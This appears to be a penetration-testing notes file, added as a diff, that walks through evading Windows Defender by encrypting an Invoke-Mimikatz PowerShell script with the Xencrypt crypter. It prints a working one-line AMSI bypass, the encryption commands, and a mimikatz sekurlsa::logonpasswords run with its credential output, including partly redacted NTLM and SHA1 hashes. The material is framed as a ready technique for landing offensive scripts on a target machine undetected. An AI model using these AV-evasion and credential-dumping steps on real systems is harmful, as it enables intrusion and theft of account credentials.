@@ -1,0 +1,103 @@
+=========================================================================================================================================================
+Simple AV bypass using the tool 'Xencrypt' (PowerShell crypter)
+=========================================================================================================================================================
+
+=> Source: https://github.com/the-xentropy/xencrypt
+
+The objective is to use 'Xencrypt' to encrypt offensive powershell scripts so we can copy them on the disk of a target Windows laptop or Windows server   
+without having them being detected and deleted by Defender AV (or other AV products)
+
+Obvisouly before running the encrypted offensive powershell scripts (stored locally on our target) it will still be necessary to bypass the AMSI first
+to avoid AV detection.
+
+===================================================================================================
+Example with 'Invoke-mimkatz.ps1' 
+===================================================================================================
+
+Step 1 - Encrypt the script 'Invoke-mimkatz.ps1' with 3 iterations of Xencrypt
+----------------------------------------------------------------------------------
+
+C:\Users\Administrator\Documents\Tools-AD>powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Administrator\Documents\Tools-AD> Import-Module ./xencrypt.ps1
+At C:\Users\Administrator\Documents\Tools-AD\xencrypt.ps1:1 char:1
++ #    Xencrypt - PowerShell crypter
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS C:\Users\Administrator\Documents\Tools-AD> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
+
+PS C:\Users\Administrator\Documents\Tools-AD> Import-Module ./xencrypt.ps1
+
+PS C:\Users\Administrator\Documents\Tools-AD> Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile C:\Users\Administrator\Desktop\invoke-encryptedm1m1.ps1 -Iterations 3
+
+Xencrypt  Copyright (C) 2020  Xentropy ( @SamuelAnttila )
+This program comes with ABSOLUTELY NO WARRANTY; for details type show w'.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+[*] Reading 'invoke-mimikatz.ps1' ...
+[*] Starting code layer  ...
+[*] Compressing ...
+[*] Generating encryption key ...
+[*] Encrypting ...
+[*] Finalizing code layer ...
+[*] Starting code layer  ...
+[*] Compressing ...
+[*] Generating encryption key ...
+[*] Encrypting ...
+[*] Finalizing code layer ...
+[*] Starting code layer  ...
+[*] Compressing ...
+[*] Generating encryption key ...
+[*] Encrypting ...
+[*] Finalizing code layer ...
+[*] Writing 'C:\Users\Administrator.PO718687\Desktop\invoke-encryptedm1m1.ps1' ...
+[+] Done!
+
+=> The file generated is not detected by the Windows Defender antivirus.
+
+
+Step 2 - Check that the encrypted 'invoke-mimkatz.ps1' is working properly by running it (after bypassing the AMSI)
+---------------------------------------------------------------------------------------------------------------------
+
+=> Note: The xecution is a bit slow due to the 3 layers of encryption...
+
+PS C:\Users\Administrator\Desktop> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
+PS C:\Users\Administrator\Desktop> . .\invoke-encryptedm1m1.ps1
+PS C:\Users\Administrator\Desktop> Invoke-Mimikatz                                                                                                                                  PS C:\Users\Administrator.PO718687\Desktop> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # privilege::debug
+Privilege '20' OK
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 278910927 (00000000:109fd7cf)
+Session           : Interactive from 5
+User Name         : Administrator
+Domain            : PO718687
+Logon Server      : PO718687
+Logon Time        : 31/10/2022 20:12:25
+SID               : S-1-5-21-936125016-2310263949-2175806047-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : PO718687
+         * NTLM     : 413eb6b2b7676dcf83d35b3eb<SNIP>
+         * SHA1     : d92b88b5912ff7112ce3690ab<SNIP>
+        tspkg :
+<SNIP>
+
